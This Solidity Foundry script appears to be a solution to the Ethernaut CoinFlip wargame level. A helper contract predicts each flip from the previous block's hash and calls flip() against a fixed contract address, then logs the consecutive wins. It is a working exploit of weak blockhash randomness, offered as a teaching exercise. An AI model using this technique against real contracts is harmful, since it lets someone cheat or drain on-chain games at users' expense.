// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Player {
    
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coin) {
        uint256 predictedHash = uint256(blockhash(block.number - 1));
        uint256 predictedNumber = predictedHash / FACTOR;

        bool side = predictedNumber == 1 ? true : false;

        _coin.flip(side);

    }
}
contract CoinFlipSolution is Script {
    CoinFlip public coin = CoinFlip(0xb70c360f7EC4bF2B04eCE62abba1963dDd405Ca9);

        function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coin);
        console.log("Consecutive Wins: ", coin.consecutiveWins());
        vm.stopBroadcast();
    }
}
